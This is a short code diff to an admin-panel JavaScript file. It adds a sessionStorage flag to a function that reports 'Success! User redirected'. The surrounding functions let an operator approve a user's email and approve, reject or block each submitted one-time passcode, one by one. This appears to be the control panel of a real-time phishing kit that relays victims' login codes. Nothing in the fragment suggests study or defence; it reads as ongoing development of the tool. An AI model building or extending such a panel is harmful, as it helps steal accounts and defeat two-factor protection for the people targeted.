@@ -939,7 +939,10 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
 // Admin action functions
 function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
 function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
-function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
+function successFirstOTP(email) { 
+    sessionStorage.setItem('successRedirect', 'true');
+    apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); 
+}
 function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
 function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
 function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
